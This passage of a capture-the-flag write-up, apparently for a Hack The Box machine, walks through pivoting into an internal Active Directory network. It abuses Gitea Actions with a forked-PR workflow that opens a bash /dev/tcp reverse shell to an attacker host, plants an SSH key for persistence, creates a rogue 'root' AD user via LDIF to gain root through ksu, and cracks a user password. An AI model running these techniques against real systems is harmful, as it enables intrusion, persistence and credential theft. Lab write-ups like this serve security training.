172.16.20.2:53
172.16.20.1:53
172.16.20.2:88
172.16.20.1:88
172.16.20.2:135
172.16.20.1:135
172.16.20.2:139
172.16.20.1:139
172.16.20.2:389
172.16.20.1:389
172.16.20.1:636
172.16.20.2:636
172.16.20.2:3000
172.16.20.2:3268
172.16.20.1:3268
172.16.20.2:3269
172.16.20.1:3269
172.16.20.1:5985
172.16.20.2:5985

# ===== 服务信息 =====
172.16.20.3:22 ssh SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.18
172.16.20.1:22 ssh SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.18
172.16.20.2:445 microsoft-ds SMB@ A j h| F X de A D%0. x `v + l0j <0: + 7 * H * H * H + 7 *0( & $not_defined_in_RFC4178@please_ig...
172.16.20.1:445 microsoft-ds SMB@ A U f G `C| ^Y PF%0. x `v + l0j <0: + 7 * H * H * H + 7 *0( & $not_defined_in_RFC4178@please_ig...
http://172.16.20.3:80 [302 Found] 302 nginx/1.24.0 (Ubuntu) [nginx,nginx/1.24.0]
http://172.16.20.1:80 [302 Found] 302 nginx/1.24.0 (Ubuntu) [nginx,nginx/1.24.0]
172.16.20.1:88 spark
172.16.20.2:88 spark
http://172.16.20.2:139
http://172.16.20.1:139
172.16.20.2:389 genetec-5400 0 d 0 0 domainFunctionality1 70 forestFunctionality1 70 ) domainControllerFunctionality1 100 3 rootD...
172.16.20.1:389 genetec-5400 0 d 0 0 domainFunctionality1 70 forestFunctionality1 70 ) domainControllerFunctionality1 100 3 rootD...
http://172.16.20.1:636
http://172.16.20.2:636
http://172.16.20.2:3000 [Gitea: Git with a cup of tea] 200 [Gitea简易Git服务,gitea,ipeakcms]
http://172.16.20.2:3269
.....
```

**Making sense of this scan:** three hosts are alive on `172.16.20.0/24` — `172.16.20.1`, `172.16.20.2`, and our current box at `172.16.20.3`. Because ICMP (ping) responses were sparse, fscan fell back on TCP probing to fill in the gaps.

The two new hosts, `172.16.20.1` and `172.16.20.2`, are clearly **Active Directory domain controllers**: they're both exposing the classic AD service fingerprint — SMB (`445`), DNS (`53`), Kerberos (`88`), LDAP (`389`), LDAPS (`636`), and RPC (`135`). Fscan even fingerprints them by name:

* `172.16.20.1` — Windows 11, hostname `DC01`
* `172.16.20.2` — Windows 11, hostname `DC02`

Both only support SMBv2 (not the older, more vulnerable SMBv1), which is why fscan's SMBv1-specific plugin throws errors against them — that's expected, not a bug.

A few other details stand out. `172.16.20.1` also serves plain HTTP (port 80, nginx). `172.16.20.2` is running something on port `3000` that fscan correctly identifies as a **Gitea** instance (a self-hosted Git server) returning HTTP 200. Both machines also expose the AD **Global Catalog** ports `3268`/`3269`, and both have `5985` open — Microsoft's WinRM management port, which will matter later.

Let's run `linpeas` on `SRV01` itself to look for any local privilege escalation angles while we continue mapping the network:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FTQOtu9sdvZfn4JA8CZuE%252FScreenshot%2520%283319%29.png%3Falt%3Dmedia%26token%3D3da4c67a-d126-4b70-9fbc-b6988891f599&width=768&dpr=3&quality=100&sign=63caacc9bf5e215b67c22b9f047f5c56&sv=3)

Interesting — `linpeas` confirms the box is aware of that Gitea instance too, which lines up with what fscan found.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fc8QEChUEuoYwJNkm69ic%252FScreenshot%2520%283320%29.png%3Falt%3Dmedia%26token%3Ddd7937f6-1c00-4be8-a3d5-7836d250737a&width=768&dpr=3&quality=100&sign=f71b3caf085f40e715c05535e96d8152&sv=3)

And Kerberos is configured on this Linux box too — meaning `SRV01` is domain-joined. Let's confirm the domain details:

```shell
josh@SRV01:/tmp$ realm list
darkzero.ext
  type: kerberos
  realm-name: DARKZERO.EXT
  domain-name: darkzero.ext
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U
  login-policy: allow-any-login
```

Confirmed: `SRV01` is joined to the `DARKZERO.EXT` Active Directory domain via `sssd`. Let's check the crontab for anything Kerberos-related, since that's often where automated domain-joined services keep their tickets fresh:

```shell
josh@SRV01:/tmp$ cat /etc/cron.d/gitea-runner-kinit
0 */8 * * * root KRB5CCNAME=/tmp/krb5cc_gitea_runner kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner
josh@SRV01:/tmp$ cat /etc/gitea-runner/svc-runner.keytab
cat: /etc/gitea-runner/svc-runner.keytab: Permission denied
```

So there's a scheduled job that re-authenticates a `svc-runner` account every 8 hours using a keytab file — but we can't read the keytab directly (yet). Let's check what service actually consumes that ticket:

```shell
josh@SRV01:/tmp$ cat /etc/systemd/system/gitea-runner.service

[Unit]
Description=Gitea Act Runner
After=network.target sssd.service
Requires=sssd.service

[Service]
Type=simple
User=darkzero-ext\svc-runner
WorkingDirectory=/opt/gitea-runner

Environment=KRB5CCNAME=/tmp/krb5cc_gitea
Environment=HOME=/opt/gitea-runner

ExecStartPre=/usr/bin/kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner

ExecStart=/opt/gitea-runner/act_runner daemon --config /opt/gitea-runner/config.yaml
ExecReload=/bin/kill -s HUP $MAINPID

Restart=always
RestartSec=10
TimeoutSec=0

[Install]
WantedBy=multi-user.target
```

This is the missing piece: `SRV01` also runs Gitea's **Act Runner** — the component that actually executes CI/CD pipeline jobs — under the `svc-runner` account, authenticated via Kerberos. If we can get a Gitea CI/CD job to run arbitrary commands, it would execute as this `svc-runner` service account. That's a very promising lead.

For completeness, here's the Kerberos client configuration on the box:

```shell
josh@SRV01:/tmp$ cat /etc/krb5.conf
#includedir /etc/krb5.conf.d/

[logging]
    default = FILE:/var/log/krb5libs.log
    kdc = FILE:/var/log/krb5kdc.log
    admin_server = FILE:/var/log/kadmind.log

[libdefaults]
    dns_lookup_realm = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false
    pkinit_anchors = FILE:/etc/pki/tls/certs/ca-bundle.crt
    spake_preauth_groups = edwards25519
default_realm = DARKZERO.EXT
    default_ccache_name = KEYRING:persistent:%{uid}
udp_preference_limit = 0

[realms]
    DARKZERO.EXT = {
        kdc = dc02.darkzero.ext
        admin_server = dc02.darkzero.ext
    }

[domain_realm]
    .darkzero.ext = DARKZERO.EXT
    darkzero.ext = DARKZERO.EXT
```

Since the domain controllers live on the internal `172.16.20.0/24` subnet and aren't directly reachable from our attack box, we need a tunnel. `sshuttle` gives us a quick and easy transparent VPN-like tunnel over our existing SSH session as `josh`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ sudo sshuttle -r josh@dzcampaigns.htb 172.16.20.0/24
[sudo] password for kuroshiro: 
josh@dzcampaigns.htb's password: 
c : Connected to server.
```

With the tunnel up, let's add `gitea.darkzero.ext`/`dc02.darkzero.ext` to our hosts file so Kerberos and HTTP requests resolve correctly:

```shell
172.16.20.2     gitea.darkzero.ext dc02.darkzero.ext
```

Now let's access Gitea at port `3000`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fx5RAmvhOaEVXE1XYDzcH%252FScreenshot%2520%283322%29.png%3Falt%3Dmedia%26token%3D8bf1b548-21fd-4081-8fea-3536bd653581&width=768&dpr=3&quality=100&sign=b4f1b26a63bdb01d928690425088c002&sv=3)

Let's explore it

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FvuYix84EQZDTBZIfoGe1%252FScreenshot%2520%283323%29.png%3Falt%3Dmedia%26token%3D2c0c9b6c-3a33-457a-b563-ab9fca96a324&width=768&dpr=3&quality=100&sign=2f6ef8bdb110a7d6e3a639b83cd2c0e9&sv=3)

While enumerating, here's an endpoint that looks abusable:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fp88CjAMgT3Pf09kFMWTx%252FScreenshot%2520%283324%29.png%3Falt%3Dmedia%26token%3D94b6fc89-d31a-4e11-91e2-b7418f3af72f&width=768&dpr=3&quality=100&sign=2df2d26f0ddb5912688a02ad0d4571cf&sv=3)

## Phase 5: Abusing Gitea Actions for a Second Foothold

This looks like a case of **Gitea Actions / CI pipeline abuse**. The plan for this stage is to chain a few weaknesses together:

1. Exploit a Kerberos-authenticated Gitea Actions misconfiguration to get code execution as the `svc-runner` service account.
2. From there, abuse a broken Active Directory OU permission, combined with `ksu` principal-name mapping, to escalate privileges further.

Since we're accessing Gitea with a valid Kerberos ticket (via the domain's Single Sign-On), our normal `josh` session already authenticates automatically using `--negotiate`. Let's search the repositories we can see:

```shell
josh@SRV01:/tmp$ curl --silent --negotiate -u ":" "http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50" | python3 -c 'import sys,json;print(json.dumps(json.load(sys.stdin),indent=2))' | grep -E '"(full_name|name)"'
        "full_name": "",
      "name": "DarkZero-Campaigns",
      "full_name": "DarkZero/DarkZero-Campaigns",
```

There's one repository visible to us: `DarkZero/DarkZero-Campaigns`. Let's pull more detail on it:

```shell
josh@SRV01:/tmp$ curl -u: --negotiate -v 'http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50'
{"ok":true,"data":[{"id":2,"owner":{"id":2,"login":"DarkZero","login_name":"","source_id":0,"full_name":"","email":"darkzero@noreply.gitea.darkzero.ext","avatar_url":"http://gitea.darkzero.ext:3000/avatars/6ff3a709898c448269322001d983c279","html_url":"http://gitea.darkzero.ext:3000/DarkZero","language":"","is_admin":false,"last_login":"0001-01-01T00:00:00Z","created":"2026-05-20T13:38:40-07:00","restricted":false,"active":false,"prohibit_login":false,"location":"","website":"","description":"","visibility":"private","followers_count":0,"following_count":0,"starred_repos_count":0,"username":"DarkZero"},"name":"DarkZero-Campaigns","full_name":"DarkZero/DarkZero-Campaigns","description":"Dev repository for DarkZero Campaigns","empty":false,"private":true,"fork":false,"template":false,"mirror":false,"size":3249,"language":"JavaScript","languages_url":"http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/languages","html_url":"http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns","url":"http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns","link":"","ssh_url":"svc-gitea@gitea.darkzero.ext:DarkZero/DarkZero-Campaigns.git","clone_url":"http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns.git","original_url":"","website":"http://dzcampaigns.htb/","stars_count":0,"forks_count":0,"watchers_count":6,"open_issues_count":0,"open_pr_counter":0,"release_counter":0,"default_branch":"main","archived":false,"created_at":"2026-05-20T13:48:11-07:00","updated_at":"2026-05-20T14:01:40-07:00","archived_at":"1969-12-31T16:00:00-08:00","permissions":{"admin":false,"push":false,"pull":true},"has_code":false,"has_issues":true,"internal_tracker":{"enable_time_tracker":true,"allow_only_contributors_to_track_time":true,"enable_issue_dependencies":true},"has_wiki":true,"has_pull_requests":true,"has_projects":true,"projects_mode":"all","has_releases":true,"has_packages":true,"has_actions":true,"ignore_whitespace_conflicts":false,"allow_merge_commits":true,"allow_rebase":true,"allow_rebase_explicit":true,"allow_squash_merge":true,"allow_fast_forward_only_merge":true,"allow_rebase_update":true,"allow_manual_merge":false,"autodetect_manual_merge":false,"default_delete_branch_after_merge":false,"default_merge_style":"merge","default_allow_maintainer_edit":false,"avatar_url":"","internal":false,"mirror_interval":"","object_format_name":"sha1","mirror_updated":"0001-01-01T00:00:00Z","topics":[],"licenses":[]}]}
* Connection #0 to host gitea.darkzero.ext left intact
```

A couple of key details in that response: the repo is `private`, our account only has `pull` (read) permission, it's written in JavaScript (matching the `dzcampaigns.htb` app we exploited earlier), and — critically — `"has_actions":true`, meaning Gitea's CI/CD system (Actions) is enabled for it.

### The Vulnerability: A "Pwn Request"

Having only *pull* access normally wouldn't let us push a malicious CI workflow directly to the repo. But we can still **fork** the repository — forks are usually a way for outside contributors to propose changes via pull requests — and if the target repository is configured to run workflows on pull-request-related events *using content from the fork*, that's a classic **"pwn request"** vulnerability (a well-documented class of GitHub/Gitea Actions bugs). The idea: an attacker submits a pull request whose CI workflow definition is attacker-controlled, and if the runner executes that workflow using privileges belonging to the target repo (rather than restricting it to the fork's own limited context), the attacker gets code execution under those elevated privileges.

Here, the trigger event of interest is `pull_request_review_comment` — if a workflow listens for that event and isn't carefully scoped, simply commenting on our own pull request could kick off a job that runs with the runner's real permissions.

Let's fork the repo:

```shell
josh@SRV01:/tmp$ curl --silent --negotiate -u: -X POST 'http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks' -H 'Content-Type: application/json' -d '{}' | python3 -m json.tool | grep '"full_name"'
        "full_name": "",
    "full_name": "darkzero-ext_josh/DarkZero-Campaigns",
            "full_name": "",
        "full_name": "DarkZero/DarkZero-Campaigns",
```

Good — we now have our own fork, `darkzero-ext_josh/DarkZero-Campaigns`. Next, let's write a malicious workflow file that fires on that `pull_request_review_comment` event and simply opens a reverse shell:

```shell
josh@SRV01:/tmp$ cat evil.yml
name: foothold
on:
  pull_request_review_comment:
    types: [created]
jobs:
  foothold:
    runs-on: ubuntu
    steps:
      - name: persist
        run: |
          bash -i >& /dev/tcp/10.10.14.32/4444 0>&1
```

Now let's base64-encode this workflow and push it into our fork through Gitea's API, then open a pull request back to the original repository so the workflow becomes associated with that PR:

```shell
josh@SRV01:/tmp$ PAYLOAD_B64=$(base64 -w0 /tmp/evil.yml) && \
curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d "{\"content\":\"$PAYLOAD_B64\",\"message\":\"add workflow\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea%2Fworkflows%2Ffoothold.yml" && \
curl -s --negotiate -u : -X POST -H "Content-Type: application/json" \
  -d '{"title":"CI Update","body":"trigger workflow","head":"darkzero-ext_josh:main","base":"main"}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls" | python3 -m json.tool | grep '"number"'
{"content":{"name":"foothold.yml","path":".gitea/workflows/foothold.yml","sha":"1c8dffc10dcc195988f1d3208a2c0e1e07aff0f2","last_commit_sha":"aff9a9b421a08437154ed8d5dbe1ff2bcb976469","last_committer_date":"2001-01-01T00:00:00Z","last_author_date":"2001-01-01T00:00:00Z","type":"file","size":209,"encoding":"base64","content":"bmFtZTogZm9vdGhvbGQKb246CiAgcHVsbF9yZXF1ZXN0X3Jldmlld19jb21tZW50OgogICAgdHlwZXM6IFtjcmVhdGVkXQpqb2JzOgogIGZvb3Rob2xkOgogICAgcnVucy1vbjogdWJ1bnR1CiAgICBzdGVwczoKICAgICAgLSBuYW1lOiBwZXJzaXN0CiAgICAgICAgcnVuOiB8CiAgICAgICAgICBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjMyLzQ0NDQgMD4mMQo=","target":null,"url":"http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea/workflows/foothold.yml?ref=main","html_url":"http://gitea.darkzero.ext:3000/darkzero-ext_josh/DarkZero-Campaigns/src/branch/main/.gitea/workflows/foothold.yml","git_url":"http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/git/blobs/1c8dffc10dcc195988f1d3208a2c0e1e07aff0f2","download_url":"http://gitea.darkzero.ext:3000/darkzero-ext_josh/DarkZero-Campaigns/raw/branch/main/.gitea/workflows/foothold.yml","submodule_git_url":null,"_links":{"self":"http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea/workflows/foothold.yml?ref=main","git":"http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/git/blobs/1c8dffc10dcc195988f1d3208a2c0e1e07aff0f2","html":"http://gitea.darkzero.ext:3000/darkzero-ext_josh/DarkZero-Campaigns/src/branch/main/.gitea/workflows/foothold.yml"}},"commit":{"url":"http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/git/commits/aff9a9b421a08437154ed8d5dbe1ff2bcb976469","sha":"aff9a9b421a08437154ed8d5dbe1ff2bcb976469","created":"0001-01-01T00:00:00Z","html_url":"http://gitea.darkzero.ext:3000/darkzero-ext_josh/DarkZero-Campaigns/commit/aff9a9b421a08437154ed8d5dbe1ff2bcb976469","author":{"name":"darkzero-ext_josh","email":"darkzero-ext_josh@noreply.gitea.darkzero.ext","date":"2001-01-01T00:00:00Z"},"committer":{"name":"darkzero-ext_josh","email":"darkzero-ext_josh@noreply.gitea.darkzero.ext","date":"2001-01-01T00:00:00Z"},"parents":[{"url":"http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/git/commits/0d2c697eb31acef7ec81df70d33415cd0150b116","sha":"0d2c697eb31acef7ec81df70d33415cd0150b116","created":"0001-01-01T00:00:00Z"}],"message":"add workflow\n","tree":{"url":"http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/git/trees/8856cd0c15783ce4bb5f43be99965c69b8d6a529","sha":"8856cd0c15783ce4bb5f43be99965c69b8d6a529","created":"0001-01-01T00:00:00Z"}},"verification":{"verified":false,"reason":"gpg.error.not_signed_commit","signature":"","signer":null,"payload":""}}
    "number": 1,
```

The workflow file was successfully committed to our fork, and the API confirms the pull request was created as `#1`. Now we just need to fire the trigger event — a review comment on that pull request:

```shell
josh@SRV01:/tmp$ curl --negotiate -u : -s -H "Content-Type: application/json" -X POST --data '{"body":"trigger","event":"COMMENT"}' "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/1/reviews"
{"id":1,"user":{"id":6,"login":"darkzero-ext_josh","login_name":"","source_id":0,"full_name":"","email":"ad8a459d-f75e-46b7-92b7-4213defd890d@localhost.localdomain","avatar_url":"http://gitea.darkzero.ext:3000/avatars/5f3a440ab8b9ef02507361310493654d","html_url":"http://gitea.darkzero.ext:3000/darkzero-ext_josh","language":"en-US","is_admin":false,"last_login":"1969-12-31T16:00:00-08:00","created":"2026-05-20T13:44:57-07:00","restricted":false,"active":true,"prohibit_login":false,"location":"","website":"","description":"","visibility":"public","followers_count":0,"following_count":0,"starred_repos_count":0,"username":"darkzero-ext_josh"},"team":null,"state":"COMMENT","body":"trigger","commit_id":"aff9a9b421a08437154ed8d5dbe1ff2bcb976469","stale":false,"official":false,"dismissed":false,"comments_count":0,"submitted_at":"2026-09-10T06:28:58-07:00","updated_at":"2026-09-10T06:28:58-07:00","html_url":"http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/pulls/1#issuecomment-2","pull_request_url":"http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/pulls/1"}
```

The review comment was posted successfully, which should have fired the `pull_request_review_comment` event our workflow is listening for. Time to check the listener:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ nc -lnvp 4444                                                             
listening on [any] 4444 ...
connect to [10.10.14.32] from (UNKNOWN) [10.129.43.37] 51182
svc-runner@SRV01:~/.cache/act/acde37e8d7a077c1/hostexecutor$
```

It worked — we've got a shell as `svc-runner`, the exact CI service account we noticed earlier in the systemd unit file. This confirms the Gitea Actions workflow was indeed running with `svc-runner`'s real permissions rather than being sandboxed away from the target repo.

To make this shell more durable than a throwaway netcat session, let's drop our own SSH public key into `svc-runner`'s `authorized_keys` so we can reconnect over SSH going forward.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ ssh-keygen -t ed25519 -f svcrunner -N "" 
Generating public/private ed25519 key pair.
Your identification has been saved in svcrunner
Your public key has been saved in svcrunner.pub
The key fingerprint is:
SHA256:yfPGoaNAtiMKpBd1W31wt/dSippgoxFF5yeS7uNC7vc kuroshiro@a1sberg
The key's randomart image is:
+--[ED25519 256]--+
|       .o o . .  |
|       . = o . . |
|    . o + + o . o|
|   . . * o + . +.|
| .. o o S . . o .|
|o  + ..= B +   . |
|o o +o. = *      |
|.o . ooo.+       |
|.    .oo..E      |
+----[SHA256]-----+
```

Now, while logged in as `svc-runner`, let's append our new public key to its `authorized_keys` file:

```shell
svc-runner@SRV01:/home/svc-runner$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKVpSHjcHmE3auidF9R/tA/MHkwnzlDk531h+RlQ+DrP kuroshiro@a1sberg" >> .ssh/authorized_keys
```

Now let's use our private key to login in SSH:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ ssh svc-runner@dzcampaigns.htb -i svcrunner         
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-136-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Sep 10 01:34:18 PM UTC 2026

  System load:  0.1                Processes:             166
  Usage of /:   50.7% of 10.66GB   Users logged in:       1
  Memory usage: 66%                IPv4 address for eth0: 172.16.20.3
  Swap usage:   33%


Expanded Security Maintenance for Applications is not enabled.

5 updates can be applied immediately.
5 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jul 23 12:34:02 2026 from 172.16.20.1
svc-runner@SRV01:~$ 
```

## Phase 6: Escalating to Root via an Active Directory OU Misconfiguration

Now let's run `linpeas` again as `svc-runner` and see if this account has any extra privileges compared to `josh`.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FtK0lr5NecAY4nsd0XGSA%252FScreenshot%2520%283325%29.png%3Falt%3Dmedia%26token%3Dab4be8cf-ac2e-48fb-b2c0-72e295da6f9d&width=768&dpr=3&quality=100&sign=7116a875dfee652b9070a9d4a944d832&sv=3)

This turns up something important: `svc-runner` has **write access to the `GiteaMigration` Organizational Unit (OU)** inside the `DARKZERO.EXT` domain. In Active Directory, having write access to an OU means you can create and modify objects inside it — including brand-new user accounts. That's a serious misconfiguration, because it means `svc-runner` can effectively mint its own AD user.

The plan: create a new AD user account (we'll call it `root`) inside that OU with a password we control, then see if we can use it to gain local root on `SRV01`.

First we need the password encoded the way Active Directory expects it — UTF-16LE, wrapped in quotes, then base64-encoded:

```shell
svc-runner@SRV01:~$ python3 -c 'import base64; print(base64.b64encode("\"PasswOrd023!\"".encode("utf-16-le")).decode())'
IgBQAGEAcwBzAHcATwByAGQAMAAyADMAIQAiAA==

svc-runner@SRV01:/tmp$ cat root.ldif
dn: CN=root,OU=GiteaMigration,DC=darkzero,DC=ext
changetype: add
objectClass: user
sAMAccountName: root
userPrincipalName: root@darkzero.ext
unicodePwd:: IgBQAGEAcwBzAHcATwByAGQAMAAyADMAIQAiAA== 
userAccountControl: 512
```

That LDIF file defines a new, fully-enabled (`userAccountControl: 512`) user object named `root`, sitting inside the `GiteaMigration` OU, with the password we just encoded. Let's submit it via `ldapmodify`, authenticating with Kerberos (`-Y GSSAPI`) using `svc-runner`'s existing ticket:

```shell
svc-runner@SRV01:/tmp$ LDAPSASL_NOCANON=yes ldapmodify -H ldap://dc02.darkzero.ext -Y GSSAPI -f root.ldif
< -H ldap://dc02.darkzero.ext -Y GSSAPI -f root.ldif
SASL/GSSAPI authentication started
SASL username: svc-runner@DARKZERO.EXT
SASL SSF: 256
SASL data security layer installed.
adding new entry "CN=root,OU=GiteaMigration,DC=darkzero,DC=ext"
```

Success — the `root` account now exists inside Active Directory. Before moving on, let's confirm we actually have a valid, usable Kerberos ticket for `svc-runner` against `DC02`'s LDAP service:

```shell
svc-runner@SRV01:/tmp$ export KRB5CCNAME=/tmp/krb5cc_gitea
export KRB5CCNAME=/tmp/krb5cc_gitea
svc-runner@SRV01:/tmp$ klist
klist
Ticket cache: FILE:/tmp/krb5cc_gitea
Default principal: svc-runner@DARKZERO.EXT

Valid starting       Expires              Service principal
09/10/2026 14:04:28  09/11/2026 00:04:28  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 09/17/2026 14:04:27
09/10/2026 14:13:01  09/11/2026 00:04:28  ldap/dc02.darkzero.ext@DARKZERO.EXT
        renew until 09/17/2026 14:04:27
```

Now for the actual privilege-escalation trick. Linux boxes joined to AD via `sssd`/Kerberos often support `ksu`, a "Kerberos su" utility that lets a Kerberos-authenticated principal switch to a *local* Unix account of the same name, provided authorization checks pass. Since our new AD principal is literally named `root@DARKZERO.EXT`, and the local system also has a `root` account, it's worth testing whether `ksu` will let us map one to the other:

```shell
svc-runner@SRV01:~$ ksu root -n root@DARKZERO.EXT
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@DARKZERO.EXT: : 
Warning: Your password will expire in less than one hour on Tue Sep 14 02:48:05 2100
Authenticated root@DARKZERO.EXT
Account root: authorization for root@DARKZERO.EXT successful
Changing uid to root (0)
root@SRV01:/home/svc-runner#
```

It worked. Authentication succeeded, `ksu` authorized the mapping from our newly-created `root@DARKZERO.EXT` Kerberos principal to the local `root` Unix account, and our UID changed to `0`. We now have full root on `SRV01`.

## Phase 7: Credential Harvesting as Root

With root access, let's look for anything left behind that could help us move further. There's a file named `darkzero_campaigns_backup.sql` sitting in root's directory — let's take a look:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FgAZxP0SesYp0u4iLx2d0%252FScreenshot%2520%283326%29.png%3Falt%3Dmedia%26token%3D6261fd5e-e846-44a1-8b7c-5fde363228f0&width=768&dpr=3&quality=100&sign=df9edd7183b9d6f61c38887652c51ec4&sv=3)

This SQL backup contains three user accounts and their password hashes. Let's save those hashes and try cracking them again:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:25 0.05% (ETA: 2026-09-12 00:39) 0g/s 94.78p/s 94.78c/s 94.78C/s rowell..895623
0g 0:00:01:28 0.05% (ETA: 2026-09-12 00:43) 0g/s 94.78p/s 94.78c/s 94.78C/s hottie!..rockon1
babygurl13       (celia)     
1g 0:00:02:05 DONE (2026-09-09 21:50) 0.007980g/s 93.95p/s 93.95c/s 93.95C/s carol1..100589
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Another cracked password — `celia:babygurl13`. Since we already have full root on the Linux host, the natural next move is to point this credential at the Active Directory environment itself.

## Phase 8: Pivoting Into Active Directory

The domain controllers sit on the internal `172.16.20.0/24` network that isn't directly reachable from our Kali box. This time, instead of `sshuttle`, let's set up a proper Layer 3 pivot using **Ligolo-ng**, which routes traffic through an agent running on the compromised host via a TUN interface.

First, the listener side, on our attack machine:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ sudo ip tuntap add user kuroshiro mode tun ligolo
[sudo] password for kuroshiro: 
                                                                                             
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ sudo ip link set ligolo up
                                                                                             
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ sudo ip route add 172.16.20.0/24 dev ligolo
                                                                                             
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ sudo ligolo-proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                            
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                            
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                             
